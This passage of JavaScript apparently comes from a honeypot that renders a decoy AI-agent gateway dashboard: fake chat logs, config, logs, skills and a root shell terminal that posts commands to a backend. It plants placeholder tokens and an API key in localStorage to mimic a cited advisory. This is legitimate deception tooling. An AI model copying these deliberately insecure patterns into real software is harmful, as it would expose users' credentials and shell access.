   feat: add kubernetes deployment merged by @devteam

3. "AWS Invoice Ready" — billing@example.com (1d ago)
   Invoice #INV-2026-03-001: $234.56

4. "Dependabot alert" — security@example.com (1d ago)
   2 high severity vulnerabilities found in dependencies

5. "Team standup tomorrow 10am" — john@example.com (2d ago)
   Please confirm your attendance</span></div>
        </div>
        <div class="chat-msg">
          <div class="chat-head"><span class="ch-pill pill-tg">Telegram</span><span>@user_handle</span><span style="margin-left:auto">34 min ago</span></div>
          <div class="chat-body"><span class="chat-user">User: Turn on the living room lights at 70%</span>
<div class="tool-call">[tool: hue.set_scene] room="Living Room" brightness=70</div>
<span class="chat-agent">Agent: Done. Living room lights are now on at 70% brightness.</span></div>
        </div>
        <div class="chat-msg">
          <div class="chat-head"><span class="ch-pill pill-dc">Discord</span><span>#ai-assistant</span><span style="margin-left:auto">1h ago</span></div>
          <div class="chat-body"><span class="chat-user">User: /status</span>
<span class="chat-agent">Agent: Gateway v${HONEYPOT_VERSION} running | Model: claude-opus-4-5 | Thinking: medium | Messages today: 142 | Cost: $4.26 | Channels: 3/5 connected</span></div>
        </div>
        <div class="chat-msg">
          <div class="chat-head"><span class="ch-pill pill-wa">WhatsApp</span><span>+1 (555) &bull;&bull;&bull;-4521</span><span style="margin-left:auto">2h ago</span></div>
          <div class="chat-body"><span class="chat-user">User: What's the weather forecast for San Francisco this week?</span>
<div class="tool-call">[tool: weather.forecast] location="San Francisco, CA" days=5</div>
<span class="chat-agent">Agent: San Francisco 5-day forecast:
Mon: Partly cloudy, 16°C / 9°C
Tue: Sunny, 18°C / 10°C
Wed: Foggy morning, 14°C / 9°C
Thu: Overcast, 13°C / 8°C
Fri: Rain, 12°C / 7°C</span></div>
        </div>
        <div class="chat-msg">
          <div class="chat-head"><span class="ch-pill pill-tg">Telegram</span><span>@user_handle</span><span style="margin-left:auto">3h ago</span></div>
          <div class="chat-body"><span class="chat-user">User: Remind me to call mom at 6pm today</span>
<div class="tool-call">[tool: cron.schedule] time="18:00" message="Call mom" once=true</div>
<span class="chat-agent">Agent: Reminder set for 6:00 PM today. I'll ping you on Telegram.</span></div>
        </div>
      </div>
    </div>

    <!-- TAB: SESSIONS -->
    <div class="tab-panel" id="tab-sessions">
      <div class="tbl-wrap">
        <table>
          <thead><tr><th>Session ID</th><th>Model</th><th>Thinking</th><th>Messages</th><th>Tokens</th><th>Cost (USD)</th><th>Created</th><th>Last Active</th><th>Status</th><th>Actions</th></tr></thead>
          <tbody>
            <tr>
              <td><span style="font-family:monospace;font-size:12px;background:rgba(249,115,22,.1);color:var(--orange);padding:2px 7px;border-radius:4px">main</span></td>
              <td style="font-family:monospace;font-size:12px">claude-opus-4-5</td>
              <td>medium</td>
              <td>142</td>
              <td style="font-size:12px;color:var(--muted)">284,318</td>
              <td>$4.26</td>
              <td style="font-size:12px;color:var(--muted)">today 00:30</td>
              <td style="font-size:12px;color:var(--muted)">5 min ago</td>
              <td><span class="badge b-ok">active</span></td>
              <td style="font-size:12px"><a href="/api/v1/sessions" style="color:var(--muted);margin-right:8px">View</a><a href="/api/v1/sessions" style="color:var(--red)">Reset</a></td>
            </tr>
          </tbody>
        </table>
      </div>
      <div style="font-size:12px;color:var(--muted)">Session key: <code style="font-family:monospace;background:rgba(255,255,255,.05);padding:2px 6px;border-radius:4px">agent:main:main</code> &nbsp;|&nbsp; DM scope: main &nbsp;|&nbsp; Store: /root/.openclaw/agents/main/sessions/sessions.json</div>
    </div>

    <!-- TAB: CONFIG -->
    <div class="tab-panel" id="tab-config">
      <div class="cfg-warn">
        Warning: This view contains sensitive configuration. API keys are masked. Use <a href="/api/v1/config" style="color:var(--yellow);text-decoration:underline">View Raw</a> to see full values.
      </div>
      <div style="font-size:12px;color:var(--muted);margin-bottom:12px">Config file: <code style="font-family:monospace;background:rgba(255,255,255,.05);padding:2px 6px;border-radius:4px">/root/.openclaw/openclaw.json</code></div>
      <div class="code-block">${escapeHtml(JSON.stringify({
  model: cfg.model, provider: cfg.provider,
  anthropicApiKey: maskKey(cfg.anthropicApiKey),
  openaiApiKey: maskKey(cfg.openaiApiKey),
  gateway: { port: cfg.gateway.port, bind: cfg.gateway.bind, hotReload: cfg.gateway.hotReload, auth: { token: maskKey(cfg.gateway.auth.token) } },
  agent: cfg.agent,
  channels: { whatsapp: { enabled: true, phone: '+1 (555) ***-4521', allowFrom: ['*'] }, telegram: { enabled: true, botToken: maskKey(cfg.channels.telegram.botToken), allowFrom: ['*'] }, discord: { enabled: true, token: maskKey(cfg.channels.discord.token), guildId: cfg.channels.discord.guildId }, slack: cfg.channels.slack, signal: cfg.channels.signal },
  skills: cfg.skills,
}, null, 2))}</div>
    </div>

    <!-- TAB: LOGS -->
    <div class="tab-panel" id="tab-logs">
      <div class="log-wrap">
        <div class="log-toolbar">
          <span style="font-size:12px;color:var(--muted)">gateway.log &nbsp;|&nbsp; /root/logs/gateway.log</span>
          <div style="display:flex;gap:8px"><button onclick="location.reload()">Refresh</button><a href="/api/v1/logs" style="padding:4px 12px;background:var(--card);border:1px solid var(--border);color:var(--muted);border-radius:6px;font-size:11px;text-decoration:none">Download</a></div>
        </div>
        <div class="log-body" id="log-body">
${[
  ['INF', `Gateway v${HONEYPOT_VERSION} starting on :18789`, '00:30:01.234'],
  ['INF', 'Loading config /root/.openclaw/openclaw.json', '00:30:01.891'],
  ['INF', 'Provider: anthropic (claude-opus-4-5)', '00:30:02.103'],
  ['INF', 'Channel whatsapp connecting...', '00:30:02.344'],
  ['INF', 'Channel whatsapp connected (+1-555-0100)', '00:30:03.211'],
  ['INF', 'Channel telegram connecting...', '00:30:03.567'],
  ['INF', 'Channel telegram connected (@oc_assistant_bot)', '00:30:04.123'],
  ['INF', 'Channel discord connecting...', '00:30:04.456'],
  ['INF', 'Channel discord connected (My Homelab / 000000000000000000)', '00:30:05.001'],
  ['WRN', 'Channel slack token refresh failed: 401 Unauthorized', '00:30:05.234'],
  ['ERR', 'Channel signal QR code expired, reconnection required', '00:30:05.567'],
  ['INF', 'Daemon heartbeat enabled (30s interval)', '00:30:05.890'],
  ['INF', 'Skills loaded: browser, gmail, github (14 total)', '00:30:06.123'],
  ['INF', `Gateway ready. Control UI: http://localhost:18789`, '00:30:06.234'],
  ['INF', '[whatsapp/main] Incoming from +1-555-0100', '14:18:31.445'],
  ['INF', '[whatsapp/main] Agent started model=claude-opus-4-5 thinking=medium', '14:18:32.012'],
  ['INF', '[whatsapp/main] Tool: gmail.list_messages', '14:18:36.789'],
  ['INF', '[whatsapp/main] Agent done 342 tokens $0.015', '14:18:47.234'],
  ['INF', '[telegram/main] Incoming from @user_handle', '14:21:15.112'],
  ['INF', '[telegram/main] Agent done 218 tokens $0.009', '14:21:23.789'],
].map(([lvl,msg,ts]) => `<div class="log-line"><span class="log-ts">[2026-03-15 ${ts}]</span><span class="log-lvl-${lvl}">[${lvl}]</span><span style="color:${lvl==='INF'?'#8b949e':lvl==='WRN'?'#eab308':'#ef4444'};margin-left:4px">${escapeHtml(msg)}</span></div>`).join('\n')}
        </div>
      </div>
    </div>

    <!-- TAB: TERMINAL -->
    <div class="tab-panel" id="tab-terminal">
      <div class="term-wrap">
        <div class="term-bar">
          <div class="term-dot" style="background:#ff5f57"></div>
          <div class="term-dot" style="background:#ffbd2e"></div>
          <div class="term-dot" style="background:#28ca41"></div>
          <span class="term-title">demo-host: shell [elevated]</span>
        </div>
        <div class="term-output" id="term-output">Last login: Fri Mar 13 21:14:33 2026 from 192.0.2.10
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com

OpenClaw Gateway v${HONEYPOT_VERSION} - Shell Access Enabled
Type 'help' for available commands.

<span class="t-prompt">root@example.com:~# </span></div>
        <div class="term-input-row">
          <span class="term-prompt-label">root@example.com:~#</span>
          <input type="text" id="term-input" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="Type a command...">
        </div>
      </div>
    </div>

    <!-- TAB: SKILLS -->
    <div class="tab-panel" id="tab-skills">
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
        <div style="font-size:13px;color:var(--muted)">14 skills installed &mdash; 8 enabled</div>
        <a href="https://clawhub.openclaw.ai" target="_blank" style="padding:7px 14px;background:rgba(249,115,22,.1);color:var(--orange);border:1px solid rgba(249,115,22,.25);border-radius:7px;font-size:13px;font-weight:500">Browse ClawHub</a>
      </div>
      <div class="skills-grid">
        ${[
          {id:'browser',name:'Browser Control',ver:'2.3.1',on:true,bundled:true},
          {id:'gmail',name:'Gmail',ver:'1.5.0',on:true,bundled:false},
          {id:'github',name:'GitHub',ver:'1.3.2',on:true,bundled:false},
          {id:'hue',name:'Philips Hue',ver:'1.2.0',on:true,bundled:false},
          {id:'spotify',name:'Spotify',ver:'1.1.4',on:true,bundled:false},
          {id:'obsidian',name:'Obsidian',ver:'1.0.8',on:true,bundled:false},
          {id:'twitter',name:'Twitter / X',ver:'1.0.3',on:false,bundled:false},
          {id:'notion',name:'Notion',ver:'1.1.0',on:true,bundled:false},
          {id:'calendar',name:'Google Calendar',ver:'1.2.1',on:true,bundled:false},
          {id:'weather',name:'Weather',ver:'1.0.5',on:true,bundled:false},
          {id:'news',name:'News',ver:'1.0.2',on:false,bundled:false},
          {id:'stocks',name:'Stocks',ver:'1.0.1',on:false,bundled:false},
          {id:'home-assistant',name:'Home Assistant',ver:'1.1.2',on:false,bundled:false},
          {id:'custom-api',name:'Custom API',ver:'0.9.4',on:true,bundled:false},
        ].map(s => `<div class="skill-card">
          <div class="skill-head"><span class="skill-name">${s.name}${s.bundled?' <span style="font-size:10px;color:var(--muted)">[bundled]</span>':''}</span><button class="skill-toggle ${s.on?'skill-on':'skill-off'}" title="${s.on?'Enabled':'Disabled'}"></button></div>
          <div style="font-size:11px;color:var(--muted)">v${s.ver} &nbsp;&mdash;&nbsp; <a href="/api/v1/skills" style="color:var(--muted);font-size:11px">uninstall</a></div>
        </div>`).join('')}
      </div>
    </div>

  </div><!-- end .content -->
</div><!-- end .main-wrap -->
</div><!-- end .layout -->

<footer>
  <div class="footer-inner">
    <span>OpenClaw Gateway v${HONEYPOT_VERSION} &mdash; Node v${FAKE_NODE_VERSION} &mdash; <a href="https://openclaw.ai" target="_blank" style="color:var(--muted)">openclaw.ai</a></span>
    <div class="bsz">
      <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
      <span>Visitors: <span id="busuanzi_value_site_uv">-</span></span>
      <span>Views: <span id="busuanzi_value_site_pv">-</span></span>
    </div>
  </div>
</footer>

<script>
// GHSA-rchv-x836-w7xp: Gateway auth token stored in localStorage (unencrypted)
try {
  localStorage.setItem('ocgw_auth_token', 'ocgw-demo-token-not-real');
  localStorage.setItem('ocgw_gateway_url', 'http://localhost:18789');
  localStorage.setItem('ocgw_version', '${HONEYPOT_VERSION}');
  localStorage.setItem('ocgw_anthropic_key', 'sk-ant-example-not-a-real-key');
  localStorage.setItem('ocgw_user_prefs', JSON.stringify({model:'claude-opus-4-5',theme:'dark',thinking:'medium',elevated:true}));
  sessionStorage.setItem('ocgw_session_token', 'demo-session-token');
} catch(_){}

// Tab navigation
document.querySelectorAll('.nav-item[data-tab]').forEach(function(link){
  link.addEventListener('click',function(e){
    e.preventDefault();
    const tab=this.dataset.tab;
    document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
    document.querySelectorAll('.tab-panel').forEach(function(p){p.classList.remove('active');});
    this.classList.add('active');
    const panel=document.getElementById('tab-'+tab);
    if(panel){panel.classList.add('active');}
    if(tab==='terminal'){document.getElementById('term-input').focus();}
  });
});

// Terminal
(function(){
  const output=document.getElementById('term-output');
  const input=document.getElementById('term-input');
  const history=[];let histIdx=-1;

  function appendLine(text,cls){
    const d=document.createElement('div');
    if(cls)d.className=cls;
    d.textContent=text;
    output.appendChild(d);
    output.scrollTop=output.scrollHeight;
  }
  function appendHTML(html){
    const d=document.createElement('div');
    d.innerHTML=html;
    output.appendChild(d);
    output.scrollTop=output.scrollHeight;
  }

  input.addEventListener('keydown',async function(e){
    if(e.key==='Enter'){
      const cmd=this.value.trim();
      if(!cmd)return;
      history.unshift(cmd);histIdx=-1;
      appendHTML('<span class="t-prompt">root@example.com:~# </span><span class="t-cmd">'+escHtml(cmd)+'</span>');
      this.value='';
      try{
        const res=await fetch('/api/v1/shell/execute',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd:cmd,session:'main'})});
        const data=await res.json();
        if(data.stdout){
          if(data.stdout==='__CLEAR__'){output.innerHTML='';return;}
          appendLine(data.stdout);
        }
        if(data.stderr) appendLine(data.stderr,'t-err');
      }catch(err){appendLine('Connection error: '+err.message,'t-err');}
      appendHTML('<span class="t-prompt">root@example.com:~# </span>');
    }else if(e.key==='ArrowUp'){
      e.preventDefault();histIdx=Math.min(histIdx+1,history.length-1);
      if(histIdx>=0)this.value=history[histIdx];
    }else if(e.key==='ArrowDown'){
      e.preventDefault();histIdx=Math.max(histIdx-1,-1);
      this.value=histIdx>=0?history[histIdx]:'';
    }
  });

  function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
})();
</script>
</body>
</html>`;
}


// ============================================================
// SECTION 10: ROUTE HANDLERS
// ============================================================
